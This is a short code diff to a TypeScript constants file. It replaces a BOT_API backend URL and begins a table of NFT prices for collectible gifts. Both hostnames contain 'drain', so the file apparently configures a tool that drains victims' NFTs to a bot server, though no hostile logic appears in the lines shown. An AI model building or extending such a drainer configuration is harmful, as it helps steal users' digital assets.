@@ -1,5 +1,4 @@
-export const BOT_API = "https://usnsjjd-drainnewjj.amvera.io";
-
+export const BOT_API = "https://nnhd-drainuernew.amvera.io";
 export const NFT_PRICES: Record<string, number> = {
   plushpepe: 5630, durovscap: 685, heartlocket: 974.99,
   heroichelmet: 201.99, preciouspeach: 305, astralshard: 135.9,
